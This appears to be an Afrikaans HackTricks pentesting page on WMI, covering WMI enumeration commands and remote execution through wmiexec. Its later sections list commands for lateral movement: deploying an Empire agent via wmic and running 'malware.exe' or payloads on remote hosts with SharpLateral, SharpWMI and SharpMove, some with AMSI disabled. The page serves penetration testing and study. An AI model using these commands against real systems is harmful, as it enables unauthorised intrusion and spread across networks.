# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Hoe Dit Werk

Proses kan op gasheer oopgemaak word waar die gebruikersnaam en óf wagwoord óf hash bekend is deur die gebruik van WMI. Opdragte word uitgevoer met behulp van WMI deur Wmiexec, wat 'n semi-interaktiewe skaalervaring bied.

**dcomexec.py:** Deur verskillende DCOM-eindpunte te benut, bied hierdie skrip 'n semi-interaktiewe skaal soortgelyk aan wmiexec.py, spesifiek deur die ShellBrowserWindow DCOM-objek te benut. Dit ondersteun tans MMC20. Aansoek, Shell Windows, en Shell Browser Window-objekte. (bron: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## WMI Grondbeginsels

### Naamruimte

Gestructureer in 'n gidsstyl hiërargie, is WMI se topvlak houer \root, waaronder addisionele gidse, bekend as naamruimtes, georganiseer is.
Opdragte om naamruimtes te lys:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Klasse binne 'n naamruimte kan gelys word met:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Klasses**

Om 'n WMI-klasnaam te ken, soos win32_process, en die naamruimte waarin dit woon, is noodsaaklik vir enige WMI-operasie.  
Opdragte om klasse te lys wat met `win32` begin:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Aanroep van 'n klas:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Metodes

Metodes, wat een of meer uitvoerbare funksies van WMI klasse is, kan uitgevoer word.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Opname

### WMI Diens Status

Opdragte om te verifieer of die WMI diens operasioneel is:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Stelsel en Proses Inligting

Versameling van stelsel- en prosesinligting deur WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Vir aanvallers is WMI 'n kragtige hulpmiddel om sensitiewe data oor stelsels of domeine te enummer.
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
Afgeleë navraag van WMI vir spesifieke inligting, soos plaaslike admins of ingelogde gebruikers, is haalbaar met sorgvuldige opdragkonstruksie.

### **Handmatige Afgeleë WMI Navraag**

Stealthy identifikasie van plaaslike admins op 'n afgeleë masjien en ingelogde gebruikers kan bereik word deur spesifieke WMI-navrae. `wmic` ondersteun ook die lees van 'n tekslêer om opdragte op verskeie nodes gelyktydig uit te voer.

Om 'n proses afgeleë oor WMI uit te voer, soos om 'n Empire-agent te ontplooi, word die volgende opdragstruktuur gebruik, met suksesvolle uitvoering aangedui deur 'n terugwaarde van "0":
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Hierdie proses illustreer WMI se vermoë vir afstandsuitvoering en stelselening, wat die nut daarvan vir beide stelselsadministrasie en penetrasietoetsing beklemtoon.

## Outomatiese Gereedskap

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- Jy kan ook **Impacket se `wmiexec`** gebruik.

## Verwysings

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
